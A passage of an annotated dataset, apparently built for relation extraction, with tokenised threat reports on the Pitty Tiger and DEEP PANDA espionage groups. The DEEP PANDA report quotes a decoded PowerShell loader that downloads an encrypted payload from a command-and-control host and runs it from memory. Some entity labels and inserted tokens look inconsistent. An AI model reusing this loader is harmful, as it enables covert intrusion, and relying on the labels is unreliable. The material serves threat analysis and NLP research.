72]}, {"r": "P3", "h": 56, "t": 49, "evidence": [59, 74]}], "title": "201407AirbusEyeOfTheTiger", "sents": [["Search", "The", "Eye", "of", "the", "Tiger"], ["By", "David", "Bizeul", ",", "Ivan", "Fontarensky", ",", "Ronan", "Mouchoux", ",", "Fabien", "Perigaud", ",", "Cedric", "Pernet", "on", "2014/07/11", ",", "11:00", "-", "Investigation", "-", "Permalink"], ["APT", "Pitty", "Tiger", "Publication", "Threat", "Intelligence", "White", "paper"], ["Cyber", "espionage", "has", "been", "a", "hot", "topic", "through", "the", "last", "years", "."], ["Computer", "attacks", "known", "as", "\u201c", "APT", "\u201d", "(", "Advanced", "Persistent", "Threat", ")", "have", "become", "widely", "reported", "and", "emphasized", "by", "the", "media", ",", "damages", "are", "now", "considered", "as", "real", "and", "strategic", "trends", "are", "moving", "in", "cyber", "defense", "."], ["OK", "Tags", "log", "anonymization", "welcome", "Today", ",", "we", "decided", "to", "release", "publicly", "information", "on", "a", "specific", "group", "of", "APT", "attackers", "known", "as", "\u201c", "Pitty", "Tiger", "\u201d", "."], ["This", "GoodFET", "information", "comes", "directly", "from", "investigations", "led", "by", "our", "Threat", "Intelligence", "and", "enlights", "the", "activities", "of", "a", "structured", "Z", "-", "Wave", "organization", "working", "in", "the", "APT", "field", "."], ["You", "can", "get", "more", "information", "in", "our", "Whitepaper", "."], ["Pitty", "Tiger", "investigation", "context", "side", "-", "channels", "critical", "infrastructures", "Hardware", "Trojans", "Sakula"], ["During", "our", "regular", "investigations", "on", "APT", "cases", ",", "one", "particular", "variant", "of", "malware", "caught", "our", "attention", ",", "because", "we", "BlackVine", "had", "not", "faced", "it", "before", "."], ["We", "decided", "to", "spend", "some", "time", "to", "investigate", "around", "this", "malware", "and", "found", "out", "that", "it", "was", "advanced", "persistent", "threat", "used", "exclusively", "by", "a", "single", "group", "of", "attackers", "."], ["This", "malware", "family", "is", "known", "as", "\u201c", "PittyTiger", "\u201d", "by", "the", "anti", "-", "virus", "ransomware", "community", "."], ["reconnaissance"], ["We", "discovered", "this", "malware", "sample", "in", "June", "2014", ",", "leading", "to", "a", "command", "&", "control", "(", "c&c", ")", "server", "still", "in", "activity", "."], ["bitcrypt", "Our", "researches", "around", "the", "malware", "family", "revealed", "the", "\u201c", "Pitty", "Tiger", "\u201d", "group", "has", "been", "active", "since", "2011", ",", "yet", "we", "found", "traces", "which", "makes", "us", "believe", "the", "group", "is", "active", "since", "2010", "."], ["This", "group", "uses", "other", "malware", "and", "tools", "during", "their", "APT", "operations", ",", "in", "addition", "to", "the", "PittyTiger", "RAT", "."], ["The", "main", "malware", "are", ":", "APT", "kill", "chain"], ["PlugX"], ["Advanced", "Persistent", "Threat", "reverse", "engineering", "PittyTiger", "malware"], ["Troj", "/", "ReRol", ".", "A", "APT", "CT", "RAT", "MM", "RAT", "(", "aka", "Troj", "/", "Goldsun", "-", "B", ")", "All", "tags"], ["Useful", "Links", "Paladin", "RAT", "(", "a", "variant", "of", "Gh0st", "RAT", ")", "Infection", "methods", "The", "Pitty", "Tiger", "group", "mostly", "uses", "spear", "phishing", "in", "order", "to", "gain", "an", "initial", "foothold", "within", "the", "targeted", "environment", "."], ["Cybersecurity", "Job", "offers"], ["AIRBUS", "D&S", "CyberSecurity"], ["BitBucket", "CyberTools", "The", "group", "exploits", "known", "vulnerabilities", "in", "Microsoft", "Office", "products", "to", "infect", "their", "targets", "with", "malware", "."], ["Pitty", "Tiger", "group", "is", "sometimes", "using", "stolen", "material", "as", "spear", "phishing", "content", "to", "target", "other", "persons", "."], ["They", "have", "also", "Share", "been", "seen", "using", "HeartBleed", "vulnerability", "in", "order", "to", "directly", "get", "valid", "credentials", ".", "0", "Malware", "information"], ["One", "of", "the", "favorite", "methods", "used", "by", "the", "Pitty", "Tiger", "group", "to", "infect", "users", "is", "to", "use", "a", "Microsoft", "Office", "Word", "document", "which", "exploits", "a", "specific", "vulnerability", "(", "CVE-2012", "-", "0158", ")", "."], ["The", "group", "could", "also", "use", "CVE-2014", "-", "1761", ",", "which", "is", "more", "recent", "."], ["The", "payload", "infecting", "the", "system", "is", "malware", "known", "as", "\u201c", "Troj", "/", "ReRol", ".", "A", "\u201d", "."], ["It", "is", "generally", "the", "first", "step", "of", "the", "initial", "compromise", "for", "Pitty", "Tiger", "campaigns", "."], ["Once", "compromised", ",", "PittyTiger", "rat", "is", "often", "installed", "."], ["This", "RAT", "is", "the", "origin", "of", "the", "attackers", "\u2019", "group", "name", "."], ["\u201c", "PittyTiger", "\u201d", "is", "a", "mutex", "used", "by", "the", "malware", "."], ["\u201c", "Pitty", "Tiger", "\u201d", "is", "also", "a", "string", "transmitted", "in", "the", "network", "communications", "of", "the", "RAT", "."], ["But", "things", "are", "changing", "."], ["CT", "RAT", "seems", "to", "be", "an", "evolution", "of", "PittyTiger", ",", "since", "a", "specific", "server", "binary", "we", "found", "could", "handle", "both", "requests", "from", "CT", "and", "PittyTiger", ",", "and", "was", "indicated", "as", "compatible", "with", "PittyTiger", "."], ["Moreover", ",", "the", "same", "commands", "are", "implemented", "in", "both", "RATs", "."], ["As", "a", "matter", "of", "fact", ",", "this", "group", "does", "neither", "use", "one", "favorite", "RAT", "nor", "two", "but", "many", "..."], ["We", "named", "as", "\u201c", "MM", "RAT", "\u201d", "a", "specific", "code", "at", "the", "beginning", "of", "our", "investigation", ",", "before", "we", "found", "an", "existing", "name", "for", "it", ",", "\u201c", "Troj", "/", "Goldsun", "-", "B", "\u201d", "according", "to", "Sophos", "."], ["This", "is", "another", "remote", "administration", "tool", "often", "used", "by", "the", "Pitty", "Tiger", "crew", "."], ["Paladin", "RAT", "is", "another", "remote", "administration", "tool", "used", "by", "the", "Pitty", "Tiger", "group", "."], ["This", "malware", "is", "a", "variant", "of", "the", "infamous", "Gh0st", "RAT", "."], ["Our", "specific", "sample", "uses", "\u201c", "ssss0", "\u201d", "instead", "of", "the", "usual", "\u201c", "Gh0st", "\u201d", "header", "for", "network", "communications", "."], ["The", "commands", "ID", "used", "in", "the", "communication", "protocol", "have", "also", "changed", ",", "but", "the", "features", "are", "quite", "the", "same", "."], ["Additionally", "to", "the", "Paladin", "RAT", "previously", "mentionned", ",", "we", "found", "another", "variant", "of", "Gh0st", "RAT", ",", "named", "\u201c", "Leo", "\u201d", "."], ["Although", "we", "have", "found", "it", "on", "a", "c&c", "server", "of", "the", "group", ",", "there", "is", "no", "evidence", "that", "is", "has", "been", "used", "by", "the", "group", ",", "in", "opposition", "to", "Paladin", "which", "is", "used", "often", "by", "Pitty", "Tiger", "."], ["INFRASTRUCTURE"], ["Subscribe", "Entries", "feed"], ["Our", "investigation", "has", "focused", "on", "three", "particular", "c&c", "servers", "used", "by", "the", "group", "."], ["These", "c&c", "servers", ",", "unlike", "the", "other", "c&cs", "used", "by", "the", "group", ",", "had", "one", "very", "common", "flaw", ":", "the", "attackers", "had", "misconfigured", "the", "access", "control", "of", "several", "folders", "."], ["Once", "parsed", "and", "dumped", ",", "it", "provided", "us", "more", "insight", "."], ["Pitty", "Tiger", ",", "like", "other", "APT", "attackers", ",", "often", "use", "anti", "-", "virus", "\u201c", "familiar", "names", "\u201d", "when", "registering", "domains", "or", "creating", "subdomains", "."], ["Some", "examples", "can", "be", "avstore.com.tw", ",", "sophos.skypetm.com.tw", ",", "symantecs.com.tw", ",", "trendmicro.org.tw", "etc", "."], ["We", "have", "been", "able", "to", "list", "the", "main", "domains", "registered", "and", "used", "by", "Pitty", "Tiger", "as", "c&c", "servers", ":", "VICTIMS"], ["Mapping", "the", "victims", "of", "such", "a", "targeted", "campaign", "is", "not", "an", "easy", "task", "."], ["We", "have", "found", "the", "Pitty", "Tiger", "group", "to", "be", "very", "active", "against", "one", "particular", "private", "company", "from", "the", "defense", "industry", "and", "one", "academic", "network", "of", "a", "government", ",", ",", "yet", "we", "think", "it", "was", "done", "to", "be", "used", "as", "a", "proxy", "for", "some", "of", "the", "group", "\u2019s", "operations", "."], ["We", "have", "also", "found", "some", "connections", "from", "other", "companies", "to", "the", "c&c", "servers", ",", "yet", "we", "did", "not", "find", "evidence", "that", "they", "were", "real", "victims", "."], ["These", "supposed", "victims", "do", "work", "in", "different", "sectors", "and", "are", "located", "mostly", "in", "European", "countries", "."], ["1", "company", "from", "the", "defense", "industry", ";", "1", "company", "from", "the", "energy", "industry", ";", "1", "company", "from", "the", "telecommunications", "industry", ";", "1", "company", "specialized", "in", "web", "development", ".", "ATTACKERS"], ["We", "found", "out", "interesting", "information", "about", "the", "Pitty", "Tiger", "group", "."], ["We", "have", "been", "able", "to", "get", "all", "the", "RDP", "connections", "to", "one", "c&c", "server", ":", "These", "connections", "are", "either", "VPS", "or", "dynamic", "IP", "addresses", ",", "mostly", "from", "China", "."], ["ROLES", "AND", "ORGANIZATION"], ["According", "to", "indicators", "we", "gathered", "and", "threat", "activities", "profiling", "we", "have", "some", "hypothesis", "on", "the", "way", "the", "group", "is", "conducting", "its", "operations", "."], ["We", "have", "strong", "evidence", "of", "a", "bot", "operator", "position", "."], ["We", "identify", "one", "nickname", "for", "this", "position", ",", "the", "user", "known", "as"], ["TooT."], ["As", "we", "did", "not", "see", "other", "nickname", ",", "we", "think", "that", "TooT", "is", "one", "person", "and", "not", "a", "group", "of", "persons", "."], ["We", "also", "identified", "a", "malware", "development", "position", "."], ["We", "identified", "two", "nicknames", "for", "this", "position", "on", "the", "current", "campaign", ",", "Automn", "Snow", "(", "\u79cb\u96ea", ")", "and", "Cold", "Air", "Kiss", "(", "\u2edb", "\u543b\u5bd2", ")", "."], ["Yet", "we", "are", "unsure", "that", "they", "belong", "to", "the", "group", ",", "they", "might", "just", "be", "a", "third", "party", "providing", "or", "selling", "their", "malware", "."], ["We", "have", "a", "strong", "suspicion", "of", "a", "coordinator", "position", ",", "which", "coordinates", "the", "bot", "operator", ",", "provides", "him", "with", "some", "logistics", "support", "(", "weaponized", "document", ",", "tools", "\u2026", ")", "and", "reviews", "the", "programmers", "work", "."], ["This", "position", "could", "imply", "a", "communication", "channel", "with", "another", "manager", "."], ["We", "named", "this", "position", "\u2018", "Chen", "\u2019", ",", "in", "relation", "with", "several", "references", "of", "this", "common", "Chinese", "name", "in", "c&c", "WHOIS", "and", "other", "investigation", "materials", "."], ["We", "have", "some", "suspicion", "of", "a", "customer", "relationship", "manager", "position", "that", "may", "act", "as", "an", "interface", "between", "a", "customer", "and", "Chen", "."], ["We", "named", "this", "position", "\u2018", "Lilly", "\u2019", "."], ["A", "proposal", "for"], ["Pitty", "Tiger", "team", "structure", "ATTACKERS", "ARSENAL"], ["The", "c&c", "servers", "used", "by", "the", "attackers", "revealed", "a", "lot", "of", "interesting", "files", "stored", "in", "various", "folders", ",", "building", "a", "real", "attackers", "arsenal", "of", "malware", "and", "tools", ":", "Malware", "(", "Troj", "/", "ReRol", ".", "A", ")"], ["Remote", "Administration", "Tools", "(", "MM", "RAT", ",", "CT", "RAT", ",", "Pitty", "Tiger", ",", "Paladin", ")"], ["E", "-", "mail", "espionage", "tools", "(", "cp.exe", ",", "mailpv.exe", ")"], ["Passwords", "dumpers", "(", "gsecdump", ",", "NirSoft", "tools", ",", "Mimikatz", "etc", ".", ")"], ["Network", "scanners", "(", "pr.exe", ")"], ["Network", "-", "oriented", "tools", "(", "po.exe", ")"], ["Vulnerability", "scanners", "(", "ssql.exe", ",", "Fluxay", ",", "etc", ".", ")"], ["What", "is", "rare", "to", "find", "is", "the", "controller", "part", "of", "those", "tools", "."], ["We", "have", "been", "lucky", "enough", "to", "get", "the", "controller", "part", "of", "Pitty", "Tiger", "and", "CT", "RAT", ",", "and", "even", "to", "get", "a", "kind", "of", "hybrid", "controller", "made", "for", "CT", "RAT", "but", "also", "supporting", "Pitty", "Tiger", "."], ["We", "suppose", "that", "the", "CT", "RAT", "is", "the", "new", "evolution", "of", "Pitty", "Tiger", "and", "that", "it", "will", "replace", "Pitty", "Tiger", "in", "the", "following", "months", "."], ["The", "presence", "of", "a", "Chinese", "version", "of", "\u201c", "calc.exe", "\u201d", ",", "the", "official", "calculator", "provided", "in", "Microsoft", "Windows", ",", "is", "interesting", "."], ["Not", "only", "is", "it", "one", "more", "indicator", "of", "a", "probable", "Chinese", "origin", ",", "but", "also", "an", "indicator", "that", "this", "server", "was", "probably", "used", "as", "a", "test", "base", ",", "in", "addition", "to", "being", "operational", "and", "controlling", "infected", "machines", "from", "different", "targets", "."], ["ATTRIBUTION"], ["Determining", "who", "is", "exactly", "behind", "an", "APT", "campaign", "is", "difficult", "."], ["We", "tried", "to", "extract", "different", "technical", "indicators", ",", "together", "with", "contextual", "elements", "."], ["Information", "relating", "to", "the", "tools", "used", "by", "the", "attackers", "has", "been", "leveraged", "for", "attribution", ":"], ["Several", "Chinese", "vulnerability", "scanners", "have", "been", "launched", "against", "targets", ";", "Several", "Chinese", "tools", "have", "been", "used", "and", "found", "on", "the", "c&c", "servers", "of", "the", "attackers", ":", "8uFTP", ",", "a", "Chinese", "version", "of", "calc.exe", ",", "etc", ".", ";"], ["Two", "of", "the", "used", "RATs", "have", "been", "developed", "by", "the", "same", "developers", ":", "CT", "RAT", "and", "PittyTiger", "RAT", "."], ["The", "controllers", "for", "these", "RATs", "show", "Chinese", "language", ";", "Several", "binaries", "used", "by", "the", "attackers", "show", "either", "\u201c", "Chinese", "-", "China", "\u201d", "or", "\u201c", "Chinese", "-", "Taiwan", "\u201d", "language", "ID", "in", "their", "resources", ";"], ["A", "decoy", "Word", "document", "has", "been", "found", ",", "written", "in", "Chinese", "language", ";", "The", "IP", "addresses", "used", "for", "the", "hosting", "of", "the", "c&c", "domains", "are", "mainly", "located", "in", "Taipei", "(", "Ta\u00efwan", ")", "and", "Hong", "Kong", "City"], ["(", "Hong", "Kong", "Special", "Administrative", "Region", ",", "PRC", "):", "All", "the", "items", "listed", "in", "this", "part", "are", "strong", "indicators", "that", "the", "attackers", "might", "be", "Chinese", "."], ["Read", "the", "full", "Whitepaper", "for", "more", "information", "Legal", "notice", "."]]}, {"vertexSet": [[{"name": "CrowdStrike", "pos": [5, 6], "sent_id": 3, "type": "Organization"}], [{"name": "CrowdStrike", "pos": [4, 5], "sent_id": 9, "type": "Organization"}], [{"name": "Falcon Host", "pos": [8, 10], "sent_id": 9, "type": "Software"}], [{"name": "Falcon Host", "pos": [2, 4], "sent_id": 10, "type": "Software"}], [{"name": "DEEP PANDA", "pos": [20, 22], "sent_id": 10, "type": "Attacker"}], [{"name": "CrowdStrike", "pos": [6, 7], "sent_id": 11, "type": "Organization"}], [{"name": "DEEP PANDA", "pos": [9, 11], "sent_id": 11, "type": "Address"}], [{"name": "government, defense, financial, legal, and the telecommunications industries", "pos": [19, 31], "sent_id": 11, "type": "ExploitTargetObject"}], [{"name": "Falcon Host", "pos": [5, 7], "sent_id": 12, "type": "Software"}], [{"name": "Falcon Host", "pos": [12, 14], "sent_id": 13, "type": "Software"}], [{"name": "Southeast Asia policy information", "pos": [11, 15], "sent_id": 14, "type": "Information"}], [{"name": "Falcon Host", "pos": [4, 6], "sent_id": 19, "type": "Software"}], [{"name": "powershell scripts", "pos": [12, 14], "sent_id": 21, "type": "Exploit"}], [{"name": "DEEP PANDA", "pos": [12, 14], "sent_id": 23, "type": "Attacker"}], [{"name": "base64", "pos": [7, 8], "sent_id": 24, "type": "Obfuscation"}], [{"name": "Wafer", "pos": [4, 5], "sent_id": 99, "type": "Payload"}], [{"name": "MadHatter .NET", "pos": [29, 31], "sent_id": 99, "type": "Malware"}], [{"name": "DEEP PANDA", "pos": [12, 14], "sent_id": 100, "type": "Attacker"}], [{"name": "DEEP PANDA", "pos": [4, 6], "sent_id": 102, "type": "Attacker"}], [{"name": "DEEP PANDA", "pos": [5, 7], "sent_id": 103, "type": "Attacker"}], [{"name": "powershell scripts", "pos": [41, 43], "sent_id": 104, "type": "Exploit"}], [{"name": "Cult of the Dead Cow\u2019s NetE", "pos": [7, 14], "sent_id": 106, "type": "Exploit"}], [{"name": "cftmon.exe", "pos": [23, 24], "sent_id": 113, "type": "Malware"}], [{"name": "uinfw", "pos": [13, 14], "sent_id": 114, "type": "Password"}], [{"name": "WMI", "pos": [6, 7], "sent_id": 115, "type": "Exploit"}], [{"name": "DEEP PANDA", "pos": [1, 3], "sent_id": 117, "type": "Attacker"}], [{"name": "multinational financial institutions", "pos": [16, 19], "sent_id": 117, "type": "ExploitTargetObject"}], [{"name": "law firms", "pos": [20, 22], "sent_id": 117, "type": "ExploitTargetObject"}], [{"name": "defense contractors", "pos": [23, 25], "sent_id": 117, "type": "ExploitTargetObject"}], [{"name": "government agencies", "pos": [27, 29], "sent_id": 117, "type": "ExploitTargetObject"}], [{"name": "Falcon Host", "pos": [36, 38], "sent_id": 118, "type": "Software"}], [{"name": "Falcon Host", "pos": [3, 5], "sent_id": 119, "type": "Software"}]], "labels": [{"r": "P17", "h": 1, "t": 2, "evidence": [9]}, {"r": "P2", "h": 13, "t": 12, "evidence": [21, 23]}, {"r": "P13", "h": 12, "t": 14, "evidence": [21, 24]}, {"r": "P2", "h": 17, "t": 16, "evidence": [99, 100]}, {"r": "P2", "h": 19, "t": 20, "evidence": [103, 104]}], "title": "201407CrowdStrikeDeepPanda", "sents": [["2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb"], ["Deep", "in", "Thought", ":"], ["Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "July", "7", ",", "2014", "Dmitri", "Alperovitch", "Executive", "Viewpoint"], ["For", "some", "time", "now", ",", "CrowdStrike", "has", "been", "working", "with", "a", "number", "of", "national", "security", "think", "tanks", "and", "human", "rights", "organizations", "on", "a", "pro", "bono", "basis", "to", "help", "them", "with", "their", "security", "posture", "."], ["These", "organizations", "face", "some", "of", "the", "most", "advanced", "nation", "-", "state", "adversaries", "\u2014", "China", ",", "Russia", ",", "and", "Iran", ",", "just", "to", "name", "a", "few", "."], ["The", "individuals", "who", "are", "typically", "targeted", "at", "these", "institutions", "tend", "to", "be", "former", "senior", "government", "officials", "who", "still", "have", "lots", "of", "contacts", "within", "Western", "governments", "and", ",", "as", "such", ",", "their", "private", "correspondence", "is", "of", "extreme", "interest", "to", "these", "attackers", "."], ["The", "intelligence", "services", "of", "these", "nation", "states", "are", "always", "on", "the", "lookout", "for", "any", "clues", "they", "may", "extract", "from", "such", "private", "communications", "that", "may", "give", "them", "an", "advanced", "insight", "into", "what", "options", "government", "policy", "makers", "are", "considering", "on", "particular", "issues", "of", "interest", "."], ["At", "the", "same", "time", ",", "with", "access", "to", "the", "victim", "email", "mailboxes", ",", "the", "adversaries", "can", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "1/9", "2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "craft", "very", "realistic", "spear", "-", "phishing", "lures", "to", "the", "government", "contacts", "of", "targeted", "think", "tank", "personnel", "by", "piggybacking", "on", "ongoing", "real", "conversations", "and", "increasing", "their", "chances", "of", "a", "successful", "compromise", "of", "an", "official", "government", "email", "account", "."], ["Despite", "this", "high", "threat", "level", ",", "these", "think", "tanks", "are", "organized", "as", "non", "-", "profits", "and", "often", "do", "not", "have", "the", "budgets", "of", "commercial", "organizations", "to", "afford", "cutting", "-", "edge", "security", "technologies", "that", "can", "help", "them", "effectively", "detect", "these", "threats", "."], ["For", "this", "reason", ",", "CrowdStrike", "has", "provided", "our", "Falcon", "Host", "endpoint", "security", "technology", "to", "many", "of", "these", "organizations", "at", "no", "charge", "to", "them", "to", "help", "detect", "and", "attribute", "these", "attackers", "on", "their", "networks", "in", "real", "time", ",", "as", "well", "as", "to", "receive", "instantaneous", "full", "forensic", "visibility", "into", "their", "behavior", "to", "help", "with", "full", "remediation", "of", "any", "incident", "."], ["Recently", ",", "Falcon", "Host", "has", "detected", "multiple", "simultaneous", "compromises", "at", "several", "national", "security", "think", "tanks", "from", "an", "actor", "we", "call", "DEEP", "PANDA", ",", "one", "of", "the", "most", "advanced", "Chinese", "nation", "-", "state", "cyber", "intrusion", "groups", "."], ["For", "almost", "three", "years", "now", ",", "CrowdStrike", "has", "monitored", "DEEP", "PANDA", "targeting", "critical", "and", "strategic", "business", "verticals", "including", ":", "government", ",", "defense", ",", "financial", ",", "legal", ",", "and", "the", "telecommunications", "industries", "."], ["At", "the", "think", "tanks", ",", "Falcon", "Host", "detected", "targeting", "of", "senior", "individuals", "involved", "in", "geopolitical", "policy", "issues", ",", "in", "particular", "in", "the", "China", "/", "Asia", "Pacific", "region", "."], ["However", ",", "last", "week", "the", "unprecedented", "real", "-", "time", "visibility", "provided", "by", "Falcon", "Host", "into", "this", "actor", "\u2019s", "escapades", "allowed", "analysts", "to", "observe", "a", "radical", "change", "in", "targeting", "."], ["This", "actor", ",", "who", "was", "engaged", "in", "targeting", "and", "collection", "of", "Southeast", "Asia", "policy", "information", ",", "suddenly", "began", "targeting", "individuals", "with", "a", "tie", "to", "Iraq", "/", "Middle", "East", "issues", "."], ["This", "is", "undoubtedly", "related", "to", "the", "recent", "Islamic", "State", "of", "Iraq", "and", "the", "Levant", "(", "ISIS", ")", "takeover", "of", "major", "parts", "of", "Iraq", "and", "the", "potential", "disruption", "for", "major", "Chinese", "oil", "interests", "in", "that", "country", "."], ["In", "fact", ",", "Iraq", "happens", "to", "be", "the", "fifth", "-", "largest", "source", "of", "crude", "oil", "imports", "for", "China", "and", "the", "country", "is", "the", "largest", "foreign", "investor", "in", "Iraq", "\u2019s", "oil", "sector", "."], ["Thus", ",", "it", "would", "n\u2019t", "be", "surprising", "if", "the", "Chinese", "government", "is", "highly", "interested", "in", "getting", "a", "better", "sense", "of", "the", "possibility", "of", "deeper", "U.S.", "military", "involvement", "that", "could", "help", "protect", "the", "Chinese", "oil", "infrastructure", "in", "Iraq", "."], ["In", "fact", ",", "the", "shift", "in", "targeting", "of", "Iraq", "policy", "individuals", "occurred", "on", "June", "18", ",", "the", "day", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "2/9", "2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "that", "ISIS", "began", "its", "attack", "on", "the", "Baiji", "oil", "refinery", "."], ["The", "Attacks", "CrowdStrike", "\u2019s", "Falcon", "Host", "technology", "used", "by", "these", "think", "tanks", "consists", "of", "a", "tiny", "(", "under", "5", "mb", "in", "size", ")", "kernel", "sensor", "that", "is", "deployed", "on", "Windows", "and", "Mac", "servers", ",", "desktops", ",", "and", "laptops", "and", "is", "able", "to", "do", "real", "-", "time", "detection", "and", "recording", "of", "all", "adversary", "activities", "taking", "place", "on", "the", "system", "."], ["In", "addition", ",", "by", "matching", "the", "detected", "activities", "against", "our", "vast", "Adversary", "Intelligence", "repository", ",", "Falcon", "Host", "can", "automatically", "attribute", "the", "attack", "to", "a", "known", "adversary", "group", "and", "provide", "details", "about", "their", "motivations", ",", "capabilities", ",", "and", "key", "Tactics", ",", "Techniques", ",", "and", "Procedures", "(", "TTPs", ")", "."], ["Recently", ",", "we", "detected", "breaches", "of", "these", "networks", "via", "the", "use", "of", "powershell", "scripts", "deployed", "by", "the", "adversary", "as", "scheduled", "tasks", "on", "Windows", "machines", "."], ["The", "scripts", "are", "passed", "to", "the", "powershell", "interpreter", "through", "the", "command", "line", "to", "avoid", "placement", "of", "extraneous", "files", "on", "the", "victim", "machine", "that", "could", "potentially", "trigger", "AV-", "or", "Indicator", "of", "Compromise", "(", "IOC)-based", "detection", "."], ["The", "scripts", "were", "scheduled", "to", "call", "back", "every", "two", "hours", "to", "the", "DEEP", "PANDA", "Command", "and", "Control", "(", "C2", ")", "infrastructure", "."], ["The", "script", "in", "the", "command", "line", "is", "base64", "encoded", ",", "but", "when", "decoded", "it", "translates", "to", "the", "following", "code", "snippet", ":"], ["[", "System", "."], ["Net", "."], ["ServicePointManager]::ServerCertificateValidationCallback"], ["http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "3/9", "2016/5/2"], ["Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "=", "{", "$", "true", "}", "$", "wc", "=", "New\u00adObject"], ["\u00adTypeName", "System", "."], ["Net", "."], ["WebClient", "$", "wc", "."], ["Headers", "."], ["Add(\u201cAccept\u00adLanguage", "\u201d", ",", "\u201c", "en\u00ad", "US", ",", "en\u037eq=0", ".", "\u201d"], ["+", "(", "[", "IntPtr]::Size", "\u2013", "1).ToString", "(", ")", ")"], ["$", "wc", "."], ["Headers", "."], ["Add(\u201cUser\u00adAgent", "\u201d", ",", "\u201c", "Mozilla/5.0", "(", "compatible\u037e", "MSIE", "10.0\u037e", "Windows", "NT", "6.1\u037e"], ["WOW64\u037e", "Trident/6.0", ")", "\u201d", ")"], ["$", "rndn", "=", "Get\u00adRandom", "$", "wc", "."], ["Headers", ".", "Add(\u201cCookie", "\u201d", ",", "\u201c", "p=", "\u201d", "+", "$", "rndn", ")", "$", "data", "=", "$", "wc", "."], ["DownloadData(\u201chttps://<ANONYMIZED>/config", "/", "oauth/", "\u201d", ")"], ["[", "string[]]$xags", "="], ["\u201c", "https://<ANONYMIZED>/config", "/", "login/", "\u201d", ",", "\u201c", "WMITool", ".", "Program", "\u201d", ",", "\u201c", "Main", "\u201d", ",", "\u201c", "/f", "\u201d", ",", "\u201c", "ssh", "\u201d", ",", "\u201c", "/s", "\u201d", ",", "\u201c", "<", "ANONYMIZED", ">", "\u201d", ",", "\u201c", "/p", "\u201d", ",", "\u201c", "443", "\u201d", "$", "Passphrase", "=", "\u201c", "<", "ANONYMIZED", ">", "\u201d", "$", "salts", "=", "\u201c", "<", "ANONYMIZED", ">", "\u201d", "$", "r", "=", "new\u00adObject", "System", "."], ["Security", "."], ["Cryptography", "."], ["RijndaelManaged", "$", "pass", "="], ["[", "System", "."], ["Text", "."], ["Encoding]::UTF8.GetBytes($Passphrase", ")"], ["$", "salt", "="], ["[", "System", "."], ["Text", "."], ["Encoding]::UTF8.GetBytes($salts", ")"], ["$", "r.", "Key", "=", "(", "new\u00adObject", "Security", "."], ["Cryptography", "."], ["PasswordDeriveBytes", "$", "pass", ",", "$", "salt", ",", "\u201c", "SHA1", "\u201d", ",", "5).GetBytes(32", ")", "#"], ["256/8", "$", "r.", "IV", "=", "(", "new\u00adObject", "Security", "."], ["Cryptography", "."], ["SHA1Managed).ComputeHash", "("], ["[", "Text", ".", "Encoding]::UTF8.GetBytes($rndn", ")", ")"], ["[", "0", "..", "15", "]", "$", "d", "=", "$", "r.", "CreateDecryptor", "(", ")", "$", "ms", "=", "new\u00adObject", "IO.MemoryStream", "@(,$data", ")"], ["$", "cs", "=", "new\u00adObject", "Security", "."], ["Cryptography", "."], ["CryptoStream", "$", "ms,$d,\u201dRead", "\u201d", "$", "dfs", "=", "New\u00adObject"], ["System", ".", "IO.Compression", "."], ["GzipStream", "$", "cs", ",", "(", "[", "IO.Compression", "."], ["CompressionMode]::Decompress", ")"], ["$", "msout", "=", "New\u00adObject", "System", "."], ["IO.MemoryStream"], ["[", "byte[]]$buffer", "=", "new\u00adobject", "byte", "[", "]", "4096"], ["[", "int]$count", "=", "0"], ["do", "{", "$", "count", "=", "$", "dfs", "."], ["Read($buffer", ",", "0", ",", "$", "buffer", "."], ["Length", ")", "$", "msout", "."], ["Write($buffer", ",", "0", ",", "$", "count", ")", "}", "while", "(", "$", "count", "\u00adgt", "0", ")"], ["$", "dfs", "."], ["Close", "(", ")"], ["$", "cs", "."], ["Close", "(", ")", "$", "ms", "."], ["Close", "(", ")"], ["$", "r.", "Clear", "(", ")"], ["[", "byte[]]$bin", "=", "$", "msout", "."], ["ToArray", "(", ")"], ["$", "al", "=", "New\u00adObject", "\u00adTypeName", "System", "."], ["Collections", "."], ["ArrayList", "$", "al", "."], ["Add($xags", ")"], ["$", "asm", "="], ["[", "System", "."], ["Reflection", "."], ["Assembly]::Load($bin", ")"], ["$", "asm", "."], ["EntryPoint", "."], ["Invoke($null", ",", "$", "al", "."], ["ToArray", "(", ")", ")"], ["sleep", "5", "Exit"], ["Once", "executed", ",", "it", "downloads", "and", "executes", "from", "memory", "a", ".NET"], ["executable", "(", "typically", "named", "Wafer", ")", ",", "which", "in", "turn", "typically", "http://www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/", "4/9", "2016/5/2", "Deep", "in", "Thought", ":", "Chinese", "Targeting", "of", "National", "Security", "Think", "Tanks", "\u00bb", "downloads", "and", "runs", "MadHatter", ".NET"], ["Remote", "Access", "Tool", "(", "RAT", ")", ",", "one", "of", "the", "favorites", "of", "DEEP", "PANDA", "."], ["By", "running", "them", "from", "memory", ",", "it", "leaves", "no", "disk", "artifacts", "or", "host", "-", "based", "IOCs", "that", "can", "be", "identified", "in", "forensic", "analysis", "."], ["This", "is", "typical", "for", "DEEP", "PANDA", "\u2014", "stealth", "is", "their", "specialty", "and", "they", "prefer", "to", "operate", "in", "a", "way", "that", "leaves", "a", "minimal", "footprint", "on", "a", "victim", "system", "and", "often", "allows", "them", "to", "evade", "detection", "for", "a", "very", "long", "time", "."], ["For", "this", "same", "reason", ",", "DEEP", "PANDA", "likes", "to", "use", "webshells", "to", "keep", "low", "-", "footprint", "persistent", "access", "to", "the", "victim", "network", ",", "as", "we", "\u2019ve", "covered", "in", "our", "prior", "blogs", "."], ["This", "case", "was", "no", "exception", ",", "and", "that", "initial", "webshell", "implant", "allowed", "them", "to", "execute", "reconnaissance", "commands", "such", "as", "\u201c", "tasklist", ",", "\u201d", "\u201c", "net", "view", ",", "\u201d", "and", "\u201c", "net", 